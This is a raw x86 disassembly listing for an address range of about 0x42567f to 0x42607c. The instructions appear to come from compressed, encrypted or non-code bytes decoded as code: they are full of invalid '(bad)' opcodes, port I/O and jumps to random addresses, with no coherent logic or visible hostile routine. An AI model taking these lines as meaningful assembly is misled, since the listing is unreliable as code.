  42567f:	pop    edx
  425680:	pushf  
  425681:	pop    es
  425682:	repz shl DWORD PTR [eax-0x6a],1
  425686:	mov    al,0x29
  425688:	shr    BYTE PTR [edx],0xfd
  42568b:	mov    eax,ds:0x33dc5db7
  425690:	and    al,0x15
  425692:	das    
  425693:	(bad)  
  425694:	imul   DWORD PTR [ebx+0x33]
  425697:	rcl    BYTE PTR [ebx],cl
  425699:	sar    DWORD PTR [esi+0x3701d5e0],cl
  42569f:	add    eax,0x723a960
  4256a4:	in     eax,0x91
  4256a6:	mov    ebp,0xfee62571
  4256ab:	les    edx,FWORD PTR [eax+edx*8-0x379ff466]
  4256b2:	pop    esp
  4256b3:	add    DWORD PTR [ebp+0x0],edi
	...
  425716:	(bad)  
  425717:	aaa    
  425718:	shl    BYTE PTR [ebx+esi*8],cl
  42571b:	cmc    
  42571c:	div    bh
  42571e:	mov    dl,0x28
  425720:	shr    DWORD PTR [ebx+0x2784047b],cl
  425726:	or     cl,BYTE PTR [edi+0x1070001]
  42572c:	add    BYTE PTR [eax],al
  42572e:	stc    
  42572f:	push   0xffffffbf
  425731:	or     dh,BYTE PTR [edi-0x4c2a3870]
  425737:	or     ch,BYTE PTR [ebx]
  425739:	push   es
  42573a:	js     0x4256ca
  42573c:	sbb    eax,0x4fd550a9
  425741:	hlt    
  425742:	pop    eax
  425743:	nop
  425744:	sti    
  425745:	nop    DWORD PTR [ecx+0x6fda364e]
  42574c:	xacquire xchg DWORD PTR [esi+0x25d73143],eax
  425753:	xchg   esp,eax
  425754:	and    ecx,DWORD PTR [eax+eax*8+0x1fd1d7a8]
  42575b:	inc    ebx
  42575c:	stos   BYTE PTR es:[edi],al
  42575d:	into   
  42575e:	retf   0xfb32
  425761:	push   ds
  425762:	add    al,0xdf
  425764:	inc    ebx
  425765:	jo     0x4257e5
  425767:	popa   
  425768:	xor    al,0x7
  42576a:	push   ebp
  42576b:	add    bh,BYTE PTR ds:0x9e3af678
  425771:	inc    ebp
  425772:	imul   ebp,edx,0x19
  425775:	ja     0x4257b7
  425777:	clc    
  425778:	or     DWORD PTR [ebp+0x20],ecx
  42577b:	add    eax,0xf06bc310
  425780:	sub    esi,0xffffff97
  425783:	dec    eax
  425784:	jb     0x425802
  425786:	sahf   
  425787:	pop    ss
  425788:	in     al,0x90
  42578a:	adc    ebx,ebp
  42578c:	and    al,0x2f
  42578e:	adc    al,BYTE PTR [ecx]
  425790:	cmp    ebx,DWORD PTR [eax-0x67]
  425793:	sbb    BYTE PTR [ecx+0x762faf17],al
  425799:	outs   dx,BYTE PTR ds:[esi]
  42579a:	xchg   esp,eax
  42579b:	jmp    0x4257ac
  42579d:	jl     0x425745
  42579f:	xchg   ebx,eax
  4257a0:	push   ss
  4257a1:	arpl   WORD PTR [ecx-0xa],si
  4257a4:	or     ebp,DWORD PTR [eax-0x1b]
  4257a7:	fdiv   QWORD PTR [edi]
  4257a9:	psadbw mm2,mm0
  4257ac:	mov    edi,0x5638d06f
  4257b1:	ins    BYTE PTR es:[edi],dx
  4257b2:	call   FWORD PTR [esi-0x186ff39c]
  4257b8:	pusha  
  4257b9:	cld    
  4257ba:	push   edx
  4257bb:	inc    ecx
  4257bc:	cmp    DWORD PTR ds:0xbdf59846,0x75c519d3
  4257c6:	into   
  4257c7:	mov    eax,ds:0x530037a4
  4257cc:	push   cs
  4257cd:	push   ds
  4257ce:	(bad)
  4257d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257d3:	retf   
  4257d4:	cmp    ch,bl
  4257d6:	fsub   st(1),st
  4257d8:	imul   edi,DWORD PTR [ecx+0x4a],0x29
  4257dc:	mov    dl,0x2f
  4257de:	sub    ebx,0xffffffed
  4257e1:	imul   ecx,DWORD PTR [esi-0x18],0xffffff97
  4257e5:	icebp  
  4257e6:	addr16 out dx,eax
  4257e8:	push   0x5a
  4257ea:	xchg   ebp,eax
  4257eb:	out    0x6a,eax
  4257ed:	les    edi,FWORD PTR [edi+0x536b92cd]
  4257f3:	jge    0x4257ae
  4257f5:	mov    al,0x4a
  4257f7:	jecxz  0x425877
  4257f9:	ins    DWORD PTR es:[edi],dx
  4257fa:	fcom   DWORD PTR [ecx-0x190cb3ab]
  425800:	push   ss
  425801:	outs   dx,DWORD PTR ds:[esi]
  425802:	outs   dx,DWORD PTR ds:[esi]
  425803:	push   ds
  425804:	add    BYTE PTR [edx-0x1ad67765],dl
  42580a:	inc    esi
  42580b:	ds inc edx
  42580d:	outs   dx,BYTE PTR ds:[esi]
  42580e:	out    dx,al
  42580f:	and    al,0x46
  425811:	push   edx
  425812:	xlat   BYTE PTR ds:[ebx]
  425813:	mov    WORD PTR [ecx+0x6aa83ccf],?
  425819:	sbb    eax,0x8a50e35d
  42581e:	ins    DWORD PTR es:[edi],dx
  42581f:	and    al,0xae
  425821:	cmp    BYTE PTR [ebx+0x31],0x6b
  425825:	popa   
  425826:	icebp  
  425827:	addr16 pop edi
  425829:	mov    ebp,0x12c00113
  42582e:	xchg   ebx,eax
  42582f:	(bad)  
  425830:	pushf  
  425831:	sahf   
  425832:	mov    dl,0xca
  425834:	test   al,0x0
	...
  425896:	pop    esp
  425897:	push   edx
  425898:	nop
  425899:	push   edx
  42589a:	sahf   
  42589b:	rcr    dh,cl
  42589d:	pop    esi
  42589e:	inc    eax
  42589f:	scas   eax,DWORD PTR es:[edi]
  4258a0:	stc    
  4258a1:	mov    ds:0xc82dc32,al
  4258a6:	adc    DWORD PTR [eax+0x1070001],edx
  4258ac:	add    BYTE PTR [eax],al
  4258ae:	push   esi
  4258af:	or     BYTE PTR [esi+0x5c],dh
  4258b2:	adc    eax,0x20c7f52b
  4258b7:	dec    esp
  4258b8:	push   ss
  4258b9:	loopne 0x425889
  4258bb:	leave  
  4258bc:	cmp    bl,bh
  4258be:	inc    ecx
  4258bf:	(bad)  
  4258c0:	cli    
  4258c1:	dec    esp
  4258c2:	cmp    eax,0x4ff49e93
  4258c7:	jmp    0xc8e5c63a
  4258cc:	lock test BYTE PTR [edi+0x3],0x27
  4258d1:	test   DWORD PTR [esi-0x2289eb2d],edx
  4258d7:	retf   
  4258d8:	sbb    ch,BYTE PTR [ebx+0x54d6a453]
  4258de:	retf   0x3a16
  4258e1:	ds cli 
  4258e3:	shl    DWORD PTR fs:[edx+0x7c],1
  4258e7:	retf   0x1e8c
  4258ea:	pop    esi
  4258eb:	lea    esi,[ebx-0x4fcb3e00]
  4258f1:	xchg   esi,eax
  4258f2:	sbb    al,al
  4258f4:	jno    0x42588c
  4258f6:	mov    dl,0x32
  4258f8:	loop   0x4258e6
  4258fa:	fsubrp st(1),st
  4258fc:	retf   0xa75c
  4258ff:	mov    ecx,0x1a9737c4
  425904:	dec    esi
  425905:	std    
  425906:	push   edi
  425907:	sub    BYTE PTR [eax+0x48bf1c49],ah
  42590d:	aaa    
  42590e:	add    bl,BYTE PTR [eax+0x1e]
  425911:	jl     0x425977
  425913:	dec    ecx
  425914:	inc    ebx
  425915:	pushf  
  425916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425917:	es out 0xad,al
  42591a:	pop    esi
  42591b:	ja     0x4258b2
  42591d:	rcl    edi,0x70
  425920:	stos   DWORD PTR es:[edi],eax
  425921:	jne    0x425998
  425923:	push   cs
  425924:	fnstsw WORD PTR [eax-0x24075779]
  42592a:	pop    edx
  42592b:	xor    bh,BYTE PTR [esi]
  42592d:	mov    eax,DWORD PTR [ebp-0x1a]
  425930:	in     al,dx
  425931:	in     eax,dx
  425932:	pop    gs
  425934:	mov    esi,0xfad9a304
  425939:	xchg   edi,eax
  42593a:	mov    eax,0xd21b10b8
  42593f:	cmp    edx,DWORD PTR [edx]
  425941:	sbb    al,0xf
  425943:	push   esp
  425944:	clc    
  425945:	jnp    0x425976
  425947:	mov    edi,DWORD PTR [edx]
  425949:	call   0x2fcaf214
  42594e:	in     al,dx
  42594f:	and    eax,0xda05be3c
  425954:	test   BYTE PTR [esi],ch
  425956:	mov    BYTE PTR [edx+edx*4],ah
  425959:	cli    
  42595a:	stos   DWORD PTR es:[edi],eax
  42595b:	mov    al,0x2c
  42595d:	loope  0x425955
  42595f:	lock mov eax,DWORD PTR [ebp+0xe97577f]
  425966:	pop    edx
  425967:	xchg   ecx,eax
  425968:	movaps xmm2,XMMWORD PTR [edi]
  42596b:	sub    al,0xe7
  42596d:	div    DWORD PTR [ecx]
  42596f:	xchg   esi,eax
  425970:	jl     0x425930
  425972:	xor    DWORD PTR [ebx+0x6c],ebp
  425975:	xcrypt-ofb (bad)
  425976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425977:	test   al,0x5
  425979:	idiv   ch
  42597b:	sub    bh,bh
  42597d:	mov    WORD PTR ds:0xf6971fc6,?
  425983:	or     eax,0x903c03c6
  425988:	shr    BYTE PTR [ecx+ebx*2+0x46],cl
  42598c:	mov    dh,0x9f
  42598e:	cli    
  42598f:	dec    esi
  425990:	mov    edx,0xf7519d04
  425995:	sbb    eax,0xd440ef0c
  42599a:	add    eax,0xb1eeef1c
  42599f:	cmc    
  4259a0:	xor    edi,0xffffffb3
  4259a3:	lock retf 0x830e
  4259a7:	popa   
  4259a8:	js     0x425954
  4259aa:	inc    eax
  4259ab:	dec    ebp
  4259ac:	xor    dl,BYTE PTR [ebp+0x5c]
  4259af:	sub    BYTE PTR [ecx],dh
  4259b1:	arpl   WORD PTR [esi-0x51],dx
  4259b4:	icebp  
	...
  425a15:	add    cl,al
  425a17:	arpl   WORD PTR [edi+eiz*2],ax
  425a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a1b:	jcxz   0x425a05
  425a1e:	mov    edi,0x84f5fe11
  425a24:	lock sti 
  425a26:	sbb    BYTE PTR [ecx+0x1070001],dl
  425a2c:	add    BYTE PTR [eax],al
  425a2e:	js     0x425a71
  425a30:	mov    al,0x9c
  425a32:	ins    BYTE PTR es:[edi],dx
  425a33:	pop    edi
  425a34:	pop    ebx
  425a35:	lods   eax,DWORD PTR gs:[esi]
  425a37:	adc    bh,BYTE PTR [ebp+0x286584e7]
  425a3d:	sbb    al,0xb
  425a3f:	stc    
  425a40:	or     al,0x7d
  425a42:	sub    al,BYTE PTR [ebx+0x64]
  425a45:	push   edi
  425a46:	popa   
  425a47:	mov    dl,0xbb
  425a49:	or     al,0xd5
  425a4b:	inc    esp
  425a4c:	xor    al,0xb5
  425a4e:	gs leave 
  425a50:	dec    esi
  425a51:	push   es
  425a52:	not    dl
  425a54:	clc    
  425a55:	ror    DWORD PTR [edx],0xc6
  425a58:	leave  
  425a59:	lds    ebx,FWORD PTR [edx]
  425a5b:	test   DWORD PTR [eax+0x41],ecx
  425a5e:	xlat   BYTE PTR ds:[ebx]
  425a5f:	cmp    DWORD PTR [ecx+ecx*2+0x702c1405],ecx
  425a66:	dec    edi
  425a67:	sbb    al,0x12
  425a69:	or     edi,DWORD PTR [eax]
  425a6b:	lea    eax,[ebp-0x13839f40]
  425a71:	pop    esi
  425a72:	sbb    al,0x71
  425a74:	mov    esp,0xe0759f92
  425a79:	sub    BYTE PTR [ecx+0x1046a0d8],bh
  425a7f:	mov    BYTE PTR [ecx],dl
  425a81:	aaa    
  425a82:	pushaw 
  425a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a85:	(bad)  
  425a86:	jmp    0x425a71
  425a88:	out    dx,eax
  425a89:	cld    
  425a8a:	pop    esi
  425a8b:	mov    eax,ds:0xb789bb2
  425a90:	mov    DWORD PTR [ebx],esi
  425a92:	data16 int 0x43
  425a95:	ja     0x425a73
  425a97:	out    dx,eax
  425a98:	sub    esi,DWORD PTR [ecx-0x45]
  425a9b:	add    BYTE PTR [eax+edx*2+0x5d],0x80
  425aa0:	xchg   ecx,eax
  425aa1:	sub    cl,BYTE PTR [edi+0x44]
  425aa4:	push   edx
  425aa5:	mov    ch,0xd4
  425aa7:	sub    DWORD PTR [edx+0x47],esp
  425aaa:	out    0x96,al
  425aac:	mov    ebx,0x364e650c
  425ab1:	jmp    0xd344e67
  425ab6:	retf   0xa92f
  425ab9:	(bad)  
  425aba:	dec    ebp
  425abb:	popf   
  425abc:	mov    ebx,0x95bf131d
  425ac1:	(bad)  
  425ac2:	push   edx
  425ac3:	xchg   ecx,eax
  425ac4:	adc    dh,BYTE PTR [edx+0x590233d0]
  425aca:	push   esp
  425acb:	cmp    al,0xc9
  425acd:	adc    eax,0xb6bc96a0
  425ad2:	xor    bh,BYTE PTR [ecx-0x57b6d16c]
  425ad8:	lds    esi,FWORD PTR [edx]
  425ada:	pop    ds
  425adb:	jp     0x425b3c
  425add:	mov    ebx,0x6cfedf38
  425ae2:	test   BYTE PTR [ebx+0x47],al
  425ae5:	and    esi,ebx
  425ae7:	in     eax,dx
  425ae8:	lock loope 0x425ac4
  425aeb:	mov    dl,0xaf
  425aed:	sub    bl,ah
  425aef:	retf   0x8278
  425af2:	sbb    al,0x15
  425af4:	pop    ebx
  425af5:	lods   al,BYTE PTR ds:[esi]
  425af6:	mov    esi,0x940f4ae6
  425afb:	test   BYTE PTR [edx+0x3af46f64],0x57
  425b02:	(bad)  
  425b03:	lds    ecx,FWORD PTR [eax]
  425b05:	add    al,BYTE PTR [edi-0x2bbbc973]
  425b0b:	aam    0xfe
  425b0d:	(bad)  
  425b0e:	sub    dh,BYTE PTR [esp+edx*1]
  425b11:	outs   dx,BYTE PTR gs:[esi]
  425b13:	imul   eax,DWORD PTR [edx-0x158b1b3e],0x22495aef
  425b1d:	test   al,0x9f
  425b1f:	jge    0x425aa6
  425b21:	xchg   esi,eax
  425b22:	repz push ds
  425b24:	lods   al,BYTE PTR ds:[esi]
  425b25:	inc    esp
  425b26:	(bad)  
  425b27:	and    BYTE PTR [eax-0x5],bl
  425b2a:	push   esp
  425b2b:	sbb    DWORD PTR [esi+edx*1],ecx
  425b2e:	jmp    0x29df:0x7dd9c376
	...
  425b95:	add    ah,al
  425b97:	clc    
  425b98:	jnp    0x425bf0
  425b9a:	jg     0x425b73
  425b9c:	in     eax,dx
  425b9d:	cli    
  425b9e:	push   0x12a5aad3
  425ba3:	mov    ecx,0x921f3f90
  425ba8:	add    DWORD PTR [eax],eax
  425baa:	pop    es
  425bab:	add    DWORD PTR [eax],eax
  425bad:	add    BYTE PTR [edx],dh
  425baf:	dec    edi
  425bb0:	inc    esi
  425bb1:	inc    edi
  425bb2:	stc    
  425bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425bb4:	loopne 0x425bc1
  425bb6:	hlt    
  425bb7:	iret   
  425bb8:	xor    BYTE PTR [ebp+0x25],al
  425bbb:	dec    eax
  425bbc:	out    dx,al
  425bbd:	(bad)  
  425bbf:	jl     0x425c21
  425bc1:	int3   
  425bc2:	sbb    bl,BYTE PTR [ebx-0x167de90]
  425bc8:	stc    
  425bc9:	jb     0x425c30
  425bcb:	mov    esp,0x5684f95d
  425bd0:	test   eax,0x3a378b6b
  425bd5:	mov    ebx,0x6db9b177
  425bda:	sub    eax,0x752aa95d
  425bdf:	outs   dx,BYTE PTR ds:[esi]
  425be0:	and    DWORD PTR [eax+eiz*2-0x4d56b20c],esi
  425be7:	scas   al,BYTE PTR es:[edi]
  425be8:	iret   
  425be9:	pop    esi
  425bea:	sub    DWORD PTR [ebp+0x4f566267],esp
  425bf0:	aad    0xdb
  425bf2:	lds    ecx,FWORD PTR [edi]
  425bf4:	mov    ebx,gs
  425bf6:	push   esi
  425bf7:	(bad)  
  425bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bf9:	sub    al,0x23
  425bfb:	popa   
  425bfc:	dec    ebx
  425bfd:	mov    ebx,0xfe50bf47
  425c02:	jecxz  0x425bb0
  425c04:	test   al,0x69
  425c06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c07:	sbb    edx,ecx
  425c09:	jnp    0x425bb4
  425c0b:	sbb    DWORD PTR [ecx],eax
  425c0d:	call   0xde6bbc4a
  425c12:	(bad)  [ebp+0x33523f99]
  425c18:	dec    edx
  425c19:	sub    cl,BYTE PTR [esi+0x146049eb]
  425c1f:	mov    dh,0x40
  425c21:	imul   esp,DWORD PTR [eax],0xf5b6a143
  425c27:	aaa    
  425c28:	push   edx
  425c29:	leave  
  425c2a:	aas    
  425c2b:	loop   0x425bcd
  425c2d:	sbb    ah,BYTE PTR [edi]
  425c2f:	push   0xa965757c
  425c34:	ret    
  425c35:	mov    BYTE PTR [eax+0x65],cl
  425c38:	mov    ah,0xea
  425c3a:	data16 jge 0x425cbb
  425c3d:	fsubr  st(3),st
  425c3f:	in     al,dx
  425c40:	adc    al,0x25
  425c42:	ror    DWORD PTR [eax+0x66],0xa4
  425c46:	pop    ecx
  425c47:	popf   
  425c48:	(bad)  
  425c49:	adc    al,ch
  425c4b:	push   ss
  425c4c:	(bad)  
  425c4d:	cwde   
  425c4e:	jns    0x425c6a
  425c50:	jl     0x425c89
  425c52:	add    edi,ebx
  425c54:	mov    esi,0xc1087784
  425c59:	cmp    cl,BYTE PTR [edi-0x1df241bb]
  425c5f:	ja     0x425c7b
  425c61:	or     al,0x96
  425c63:	arpl   WORD PTR [eax],cx
  425c65:	mov    ebp,DWORD PTR [ecx+ebx*1-0x52]
  425c69:	int    0x9f
  425c6b:	fsubr  st,st(3)
  425c6d:	xchg   esp,eax
  425c6e:	push   ds
  425c6f:	pop    edx
  425c70:	int    0x74
  425c72:	pop    es
  425c73:	mov    al,0x9f
  425c75:	out    dx,eax
  425c76:	call   0xed92:0xfd7ec639
  425c7d:	xchg   DWORD PTR [edi],ebp
  425c7f:	pop    edx
  425c80:	or     al,0x59
  425c82:	sar    BYTE PTR [edx],1
  425c84:	mov    ecx,0x1f6d034f
  425c89:	int3   
  425c8a:	pop    ecx
  425c8b:	(bad)  
  425c8c:	rep ins DWORD PTR es:[edi],dx
  425c8e:	inc    edx
  425c8f:	cmp    bh,BYTE PTR [edx+ecx*8]
  425c92:	jmp    0x127ab5a4
  425c97:	dec    ecx
  425c98:	mul    esi
  425c9a:	pop    edi
  425c9b:	fild   DWORD PTR [eax]
  425c9d:	jmp    0x75b2300d
  425ca2:	jne    0x425c33
  425ca4:	mov    bl,0x5e
  425ca6:	pop    eax
  425ca7:	mov    ch,0xe7
  425ca9:	sub    bh,dl
  425cab:	in     al,0xa6
  425cad:	xchg   DWORD PTR [edi+0x5f],ecx
  425cb0:	pop    eax
  425cb1:	loop   0x425cce
  425cb3:	pop    eax
  425cb4:	out    dx,eax
	...
  425d15:	add    bh,bh
  425d17:	lods   al,BYTE PTR ds:[esi]
  425d18:	fadd   QWORD PTR [edi]
  425d1a:	fbstp  TBYTE PTR [edi-0x1]
  425d1d:	cld    
  425d1e:	fidiv  DWORD PTR [esi+0xd]
  425d21:	in     al,0x9d
  425d23:	add    BYTE PTR [eax+0x1932641],0x0
  425d2a:	pop    es
  425d2b:	add    DWORD PTR [eax],eax
  425d2d:	add    bl,dh
  425d2f:	mov    ecx,0x47cd6194
  425d34:	adc    al,0x5
  425d36:	and    esp,DWORD PTR [edi]
  425d38:	pop    edx
  425d39:	arpl   WORD PTR [edi+ebx*8-0x6a],cx
  425d3d:	push   ss
  425d3e:	xchg   BYTE PTR [edi],cl
  425d40:	cmp    dh,ch
  425d42:	inc    edx
  425d43:	mov    edi,0xd04e9244
  425d49:	sahf   
  425d4a:	and    eax,0x7d5e1b42
  425d4f:	mov    ds,WORD PTR [edx-0x33]
  425d52:	dec    edi
  425d53:	stos   DWORD PTR es:[edi],eax
  425d54:	or     ah,dl
  425d56:	popa   
  425d57:	cmp    eax,0xdcc05cd9
  425d5c:	(bad)  [esi+0x1b]
  425d5f:	and    eax,0x1561a0cf
  425d64:	mov    ss,ebx
  425d66:	xchg   ecx,eax
  425d67:	xor    al,0x59
  425d69:	dec    DWORD PTR [ecx+0x2e]
  425d6c:	xchg   ecx,edx
  425d6e:	jle    0x425d3b
  425d70:	sub    esp,DWORD PTR [edi]
  425d72:	aaa    
  425d73:	stos   DWORD PTR es:[edi],eax
  425d74:	adc    BYTE PTR [edx-0x34],0x48
  425d78:	jle    0x425da2
  425d7a:	(bad)  
  425d7b:	sub    dh,BYTE PTR [ecx-0x13]
  425d7e:	pop    ss
  425d7f:	mov    dh,0xe4
  425d81:	cmp    bl,BYTE PTR [ebx-0x57]
  425d84:	call   0xd74c:0xf392f9b1
  425d8b:	dec    eax
  425d8c:	mov    ebp,0xdcfc6829
  425d91:	(bad)  
  425d92:	jecxz  0x425e0a
  425d94:	mov    ebp,0x126c622d
  425d99:	and    al,0xb9
  425d9b:	inc    ax
  425d9d:	shr    BYTE PTR [ecx],cl
  425d9f:	and    esi,DWORD PTR [eax+0x36bb077c]
  425da5:	retf   
  425da6:	push   ds
  425da7:	push   esi
  425da8:	std    
  425da9:	ins    BYTE PTR es:[edi],dx
  425daa:	jge    0x425e25
  425dac:	push   ds
  425dad:	xchg   esp,eax
  425dae:	(bad)  
  425daf:	pop    ebx
  425db0:	push   esi
  425db1:	jno    0x425d3c
  425db3:	jns    0x425da7
  425db5:	dec    ebx
  425db6:	mov    WORD PTR [edi-0x76],bp
  425dba:	rcr    BYTE PTR [edx],cl
  425dbc:	pop    ebx
  425dbd:	sbb    BYTE PTR [esi+0x47624f20],0x4f
  425dc4:	push   ebx
  425dc5:	jno    0x425d8a
  425dc7:	inc    ecx
  425dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425dc9:	std    
  425dca:	fcomp  QWORD PTR [ebp-0xa839e1f]
  425dd0:	and    ah,al
  425dd2:	mov    BYTE PTR [eax-0x7f6c61],bh
  425dd8:	mov    BYTE PTR [ecx+esi*8+0x5],al
  425ddc:	sti    
  425ddd:	pop    edi
  425dde:	neg    BYTE PTR [edi]
  425de0:	stc    
  425de1:	fld    DWORD PTR [eax+0x4d]
  425de4:	adc    al,0x87
  425de6:	ins    BYTE PTR es:[edi],dx
  425de7:	aas    
  425de8:	jp     0x425d84
  425dea:	pop    edi
  425deb:	and    esp,ecx
  425ded:	push   esi
  425dee:	lods   al,BYTE PTR ds:[esi]
  425def:	push   0xf660e578
  425df4:	fwait
  425df5:	cmp    al,0x9a
  425df7:	push   esi
  425df8:	outs   dx,DWORD PTR ds:[esi]
  425df9:	sahf   
  425dfa:	push   ds
  425dfb:	into   
  425dfc:	jns    0x425dd9
  425dfe:	sahf   
  425dff:	mov    esi,0x5b9fa683
  425e04:	mov    ds:0x8a654d12,al
  425e09:	pushf  
  425e0a:	add    BYTE PTR [ecx-0x63],bl
  425e0d:	imul   ebp,DWORD PTR [ebx],0xffffffeb
  425e10:	ret    
  425e11:	outs   dx,BYTE PTR ds:[esi]
  425e12:	add    DWORD PTR [eax+ecx*8-0x7c],ebx
  425e16:	push   ebp
  425e17:	jae    0x425e3e
  425e19:	imul   esi,DWORD PTR [eax],0x57
  425e1c:	mov    eax,DWORD PTR [edi+edi*1-0x57b6f4c4]
  425e23:	push   0x6c295983
  425e28:	fisttp QWORD PTR [ebx+eiz*1]
  425e2b:	push   ebx
  425e2c:	popf   
  425e2d:	les    eax,FWORD PTR [ebp+eax*2+0x105865a2]
  425e34:	pop    ds
	...
  425e95:	add    dh,al
  425e97:	jl     0x425eea
  425e99:	sar    bl,1
  425e9b:	std    
  425e9c:	(bad)  
  425e9d:	jle    0x425ea2
  425e9f:	test   BYTE PTR [edi],0xb2
  425ea2:	xlat   BYTE PTR ds:[ebx]
  425ea3:	inc    esi
  425ea4:	fisttp QWORD PTR [esi+0x1942d]
  425eaa:	pop    es
  425eab:	add    DWORD PTR [eax],eax
  425ead:	add    BYTE PTR [edx],al
  425eaf:	xchg   esp,eax
  425eb0:	push   ebp
  425eb1:	loop   0x425e86
  425eb3:	pop    ebp
  425eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425eb5:	es (bad) 
  425eb7:	xchg   esp,eax
  425eb8:	push   eax
  425eb9:	jg     0x425edb
  425ebb:	pusha  
  425ebc:	or     ebp,ebx
  425ebe:	jg     0x425f05
  425ec0:	mov    esi,0x5310d496
  425ec5:	mov    al,0xb7
  425ec7:	test   eax,0x126468f3
  425ecc:	pop    esp
  425ecd:	xchg   ecx,eax
  425ece:	in     al,0x45
  425ed0:	popa   
  425ed1:	aaa    
  425ed2:	ficomp WORD PTR [edi+0x46]
  425ed5:	inc    eax
  425ed6:	cmp    DWORD PTR [edi-0x33],ebp
  425ed9:	icebp  
  425eda:	mov    edx,0xf13a28d3
  425edf:	aad    0xe1
  425ee1:	jbe    0x425f24
  425ee3:	xchg   esi,eax
  425ee4:	imul   edi,DWORD PTR [eax],0x8d9e9104
  425eea:	xchg   edx,eax
  425eeb:	add    al,0x45
  425eed:	icebp  
  425eee:	or     DWORD PTR [esi],0xffffffb0
  425ef1:	(bad)  
  425ef2:	mov    ecx,DWORD PTR [edx-0x7b]
  425ef5:	fwait
  425ef6:	dec    esi
  425ef7:	test   eax,0xd0c2a6a6
  425efc:	mov    al,ds:0xb9d87ed2
  425f01:	pop    esp
  425f02:	call   0xd197:0xb5d78f0
  425f09:	shl    DWORD PTR [ecx],1
  425f0b:	(bad)  
  425f0c:	pushf  
  425f0d:	pop    edi
  425f0e:	inc    ebp
  425f0f:	arpl   WORD PTR [ebp+esi*2+0x4b],cx
  425f13:	aad    0xe7
  425f15:	push   cs
  425f16:	lock mov bh,0xdb
  425f19:	sbb    dh,BYTE PTR [ecx-0x714fb49d]
  425f1f:	xchg   DWORD PTR [edx],ebp
  425f21:	arpl   dx,dx
  425f23:	push   ebp
  425f24:	mov    bh,0xf9
  425f26:	xlat   BYTE PTR ds:[ebx]
  425f27:	test   ecx,ebp
  425f29:	add    ah,dl
  425f2b:	and    DWORD PTR [esp+ecx*2+0x11],ebx
  425f2f:	aas    
  425f30:	mov    al,0x7f
  425f32:	sti    
  425f33:	cmp    BYTE PTR [ecx],dh
  425f35:	xchg   ecx,eax
  425f36:	or     bl,BYTE PTR [edx-0x2bb56d61]
  425f3c:	jne    0x425f13
  425f3e:	aad    0xef
  425f40:	sar    BYTE PTR [ebx+0x6243bd36],cl
  425f46:	add    DWORD PTR [esi],esi
  425f48:	and    BYTE PTR [esi-0x7e],bl
  425f4b:	hlt    
  425f4c:	xchg   edx,eax
  425f4d:	cmc    
  425f4e:	jle    0x425ed9
  425f50:	int    0x5
  425f52:	retf   
  425f53:	pop    ss
  425f54:	scas   al,BYTE PTR es:[edi]
  425f55:	mov    eax,0xc2a3e8db
  425f5a:	rcl    BYTE PTR [ebx],cl
  425f5c:	pop    edi
  425f5d:	(bad)  
  425f5f:	inc    esp
  425f60:	dec    esi
  425f61:	rcr    BYTE PTR [esi+0x2e],1
  425f64:	popa   
  425f65:	scas   al,BYTE PTR es:[edi]
  425f66:	ret    0x5e7f
  425f69:	and    edi,DWORD PTR [edx+eax*8-0x5a2df18e]
  425f70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f71:	xor    eax,0x7ee4aece
  425f76:	push   es
  425f77:	(bad)  
  425f78:	gs inc esi
  425f7a:	bound  ebp,QWORD PTR [ebx+0x6371cf6a]
  425f80:	pusha  
  425f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f82:	or     BYTE PTR [ebp-0x5],dl
  425f85:	lods   eax,DWORD PTR ds:[esi]
  425f86:	sub    ah,ah
  425f88:	xchg   edi,eax
  425f89:	test   DWORD PTR ds:0xeb5898a6,esi
  425f8f:	adc    bh,BYTE PTR [eax+0x15]
  425f92:	fild   WORD PTR [eax]
  425f94:	cld    
  425f95:	xchg   BYTE PTR [edi-0x363d8b1f],dh
  425f9b:	pop    ebx
  425f9c:	pop    ss
  425f9d:	ins    DWORD PTR es:[edi],dx
  425f9e:	mov    WORD PTR [eax+0x216cfa1f],?
  425fa4:	sub    DWORD PTR ds:0x47153454,ebp
  425faa:	sbb    esp,DWORD PTR [edi+0x44f4def3]
  425fb0:	xchg   edx,eax
  425fb1:	fild   DWORD PTR [ecx+0xa28e]
	...
  426013:	add    BYTE PTR [eax],al
  426015:	add    BYTE PTR [ecx],bh
  426017:	cwde   
  426018:	or     eax,DWORD PTR [esi]
  42601a:	stos   DWORD PTR es:[edi],eax
  42601b:	xchg   edi,eax
  42601c:	cmp    eax,0x791073bf
  426021:	mov    esi,0x860ab04f
  426026:	xor    al,0x95
  426028:	add    DWORD PTR [eax],eax
  42602a:	pop    es
  42602b:	add    DWORD PTR [eax],eax
  42602d:	add    BYTE PTR [ebp+esi*1-0x6b],dh
  426031:	and    cl,BYTE PTR gs:[ebx-0x3fe7d21]
  426038:	xor    DWORD PTR [edi],edx
  42603a:	ds fs js 0x42607b
  42603e:	ret    0xdd6d
  426041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426042:	jle    0x426028
  426044:	rol    BYTE PTR [ecx-0x30942ce7],1
  42604a:	cwde   
  42604b:	jo     0x425fdd
  42604d:	xor    al,0x25
  42604f:	test   al,0x86
  426051:	adc    DWORD PTR ds:0x3631b9d1,esp
  426057:	sub    al,0x50
  426059:	dec    edx
  42605a:	adc    al,0x78
  42605c:	dec    edi
  42605d:	test   ebx,edi
  42605f:	jo     0x4260c9
  426061:	or     BYTE PTR cs:[esi+0x47],ch
  426065:	pop    esp
  426066:	arpl   bx,bx
  426068:	inc    esp
  426069:	inc    esi
  42606a:	pop    ebx
  42606b:	stos   BYTE PTR es:[edi],al
  42606c:	sbb    al,0x76
  42606e:	retf   
  42606f:	mov    edx,0xf58d8e56
  426074:	neg    ah
  426076:	jp     0x426034
  426078:	leave  
  426079:	mov    bl,BYTE PTR [esi-0x51]
  42607c:	sub    eax,0xfd28b9ba
